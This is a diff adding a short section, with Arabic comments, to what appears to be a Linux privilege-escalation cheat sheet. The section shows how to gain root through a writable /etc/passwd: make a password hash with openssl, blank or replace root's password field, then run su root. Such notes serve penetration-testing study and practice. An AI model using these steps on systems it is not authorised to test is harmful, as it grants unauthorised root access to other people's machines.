@@ -156,6 +156,28 @@ Used responsibly, this is a great example of **local privilege escalation** via 
 
 
 
+* <details>
+     <summary>Writable /etc/passwd</summary>
+
+    ### 3. Writable /etc/passwd (يمكن الكتابة)
+
+   * `openssl passwd frank`
+    * (لعمل باسورد جديد)
+       * `$1$aBcDeF$gH...`
+
+   * `nano /etc/passwd`
+       * `root:x:0:0:root:/root:/bin/bash` (remove `x`)
+       * Becomes -> `root::0:0:root:/root:/bin/bash` (الباسورد الان فاضي)
+       * `root:$1$aBcDeF$gH...:0:0:root:/root:/bin/bash` ( اكتب الباسورد اللى انت عملته مكان ال `x`)
+
+   * `su root`
+    * (اكتب الباسورد الجديد و مبروك عليك!!!)
+
+
+  </details>
+
+
+
 
   
 </details>
